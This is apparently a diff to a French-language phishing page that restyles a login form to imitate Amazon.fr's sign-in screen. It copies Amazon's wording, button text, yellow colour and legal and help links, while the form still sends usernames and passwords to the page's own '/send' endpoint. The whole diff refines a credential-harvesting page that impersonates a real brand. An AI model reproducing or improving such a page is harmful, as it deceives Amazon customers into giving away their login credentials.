@@ -35,7 +35,7 @@ align-items:center;
 
 .bottom-section{
 height:44.44vh;
-border-top:1px solid #ccc;
+border-top:1px solid #b6b6b6;
 display:flex;
 justify-content:center;
 align-items:top;
@@ -52,7 +52,7 @@ font-size:12px;
   display:flex;
   flex-direction:column;
   align-items:center;
-  transform: translateY(-40px);
+  transform: translateY(-50px);
 }
 
 .logo img{
@@ -65,10 +65,10 @@ font-size:12px;
 
 .container{
   background:white;
-  padding:40px;
-  padding-top:10px;
-  border-radius:10px;
-  width:260px;
+  padding:25px;
+  padding-top:2px;
+  border-radius:9px;
+  width:300px;
   height:40vh;
   border:1px solid #d5d9d9;
   box-shadow:none;
@@ -77,7 +77,7 @@ font-size:12px;
 }
 
 h2{
-font-size:19px;
+font-size:20px;
 font-weight:normal;
 margin-bottom:20px;
 color:#333;
@@ -88,14 +88,25 @@ font-size:14px;
 font-weight:600;
 }
 
+.top-section a{
+color: #3a6ea5;
+text-decoration: underline;
+}
+
+.top-section h4{
+font-size:14px;
+font-weight:400;
+}
+
 input{
 width:90%;
-padding:12px;
-margin-top:10px;
+padding:10px;
+margin-top:5px;
 border:1px solid #ddd;
 border-radius:8px;
 outline:none;
 transition:0.2s;
+transform: translateY(-6px);
 }
 
 input:focus{
@@ -105,8 +116,8 @@ box-shadow:0 0 1px #FFCE12;
 
 button{
 width:100%;
-padding:12px;
-margin-top:15px;
+padding:8px;
+margin-top:6px;
 background:#FFCE12;
 filter: brightness(1.05);
 color:black;
@@ -124,8 +135,9 @@ filter: contrast(0.95) brightness(0.99);
 
 .footer{
 margin-top:15px;
+max-width:290px;
 font-size:12px;
-color:gray;
+color:black;
 }
 
 </style>
@@ -148,15 +160,28 @@ color:gray;
 
       <form method="POST" action="/send">
 
-        <input name="username" placeholder="Nom d'utilisateur" required />
+        <input name="username" placeholder="Téléphone ou adresse e-mail" required />
         <input type="password" name="password" placeholder="Mot de passe" required />
 
-        <button type="submit">Se connecter</button>
+        <button type="submit">Continuer</button>
 
       </form>
 
       <div class="footer">
-        Connexion Sécurisée
+      <p>
+        En continuant, vous acceptez les
+        <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?nodeId=GLSBYFE9MGKKQXXM&ie=UTF8&ref_=ap_signin_notification_condition_of_use">conditions d'utilisation et de vente</a>.
+        d'Amazon. Consultez notre
+        <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?nodeId=GX7NJQ4ZB8MHFRNJ&ie=UTF8&ref_=ap_signin_notification_privacy_notice">déclaration de confidentialité</a>
+        , notre
+        <a href="https://www.amazon.fr/gp/help/customer/display.html/?nodeId=GVASXV5UZ64R4Y25"> politique relative aux cookies</a>
+        ainsi que notre
+        <a href="https://www.amazon.fr/gp/help/customer/display.html?nodeId=G64JFZVFDY66XG9K">politique relative aux publicités ciblées par centres d'intérêts.</a>
+      </p> 
+
+      <h4> 
+        <a href="https://www.amazon.fr/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">Vous avez besoin d'aide pour vous identifier ?</a>
+      </h4>
       </div>
 
     </div>
